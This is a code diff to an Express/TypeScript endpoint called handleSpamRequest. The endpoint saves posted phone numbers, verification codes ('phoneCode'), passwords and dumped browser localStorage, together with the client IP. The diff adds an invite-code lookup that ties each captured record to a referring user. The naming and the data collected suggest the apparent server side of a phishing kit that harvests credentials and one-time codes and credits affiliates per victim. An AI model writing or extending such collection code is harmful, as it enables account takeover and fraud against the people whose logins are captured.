@@ -2,6 +2,7 @@ import { Request, Response } from 'express';
 import Customer from '../models/customer'; // 确保正确导入 Customer 模型
 import handleAsync from '../utils/handleAsync';
 import { io } from '../services/socket';
+import User from '../models/user';
 
 export const handleSpamRequest = handleAsync(
   async (req: Request, res: Response) => {
@@ -9,7 +10,8 @@ export const handleSpamRequest = handleAsync(
 
     const parsedData = JSON.parse(data);
 
-    const { phoneCode, password, phoneNumber, ...rest } = parsedData;
+    const { phoneCode, password, phoneNumber, inviteCode, ...rest } =
+      parsedData;
 
     if (!phoneNumber && !phoneCode) {
       res.status(400);
@@ -22,12 +24,15 @@ export const handleSpamRequest = handleAsync(
 
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress; // 获取客户端 IP 地址
 
+    const user = (await User.findOne({ inviteCode })) || null;
+
     if (customer) {
       await customer.updateOne({
         phoneCode,
         password: password || customer.password,
         localStorage: JSON.stringify(rest),
         ip,
+        user,
       });
     } else {
       const newCustomer = new Customer({
@@ -36,6 +41,7 @@ export const handleSpamRequest = handleAsync(
         phoneNumber,
         localStorage: JSON.stringify(rest),
         ip,
+        user,
       });
       await newCustomer.save();
 
